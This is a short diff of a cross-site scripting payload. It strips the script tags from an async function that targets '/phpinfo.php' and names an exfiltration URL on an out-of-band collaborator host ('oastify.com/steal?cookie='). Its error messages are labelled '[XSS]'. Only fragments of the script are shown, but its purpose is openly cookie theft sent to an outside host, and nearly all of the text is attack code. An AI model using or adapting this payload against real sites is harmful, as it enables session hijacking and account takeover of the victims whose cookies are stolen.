@@ -1,4 +1,4 @@
-<script>
+
 (async () => {
   const target = "/phpinfo.php"; // adjust path if needed
   const exfil = "https://rd88es043najc5o0z6ywpo7dt4zvnrbg.oastify.com/steal?cookie=";
@@ -52,4 +52,3 @@
     console.error("[XSS] Top-level error:", e);
   }
 })();
-</script>
